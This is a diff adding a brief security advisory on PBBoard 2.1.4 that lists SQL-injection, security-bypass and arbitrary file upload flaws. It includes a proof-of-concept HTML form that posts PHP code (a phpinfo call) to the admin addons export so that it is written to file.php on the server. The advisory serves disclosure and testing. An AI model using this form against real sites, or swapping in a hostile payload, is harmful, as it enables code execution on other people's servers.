@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/54916/info
+  
+PBBoard is prone to multiple security vulnerabilities including:
+  
+1. Multiple SQL-injection vulnerabilities
+2. A security-bypass vulnerability
+3. An arbitrary file upload vulnerability
+  
+Exploiting these issues could allow an attacker to carry out unauthorized actions on the underlying database, to gain access to various user accounts by changing account passwords, or to execute arbitrary script code on an affected computer in the context of the affected application.
+  
+PBBoard 2.1.4 is vulnerable; other versions may also be affected.
+
+
+<form action="http://www.example.com/admin.php?page=addons&export=1&export_writing=1&xml_name=file.php" method="post" name="main" id="main">
+<input type="hidden" name="context" value='<? phpinfo(); ?>'>
+<input type="submit" name="Submit" value="Send">
+</form>
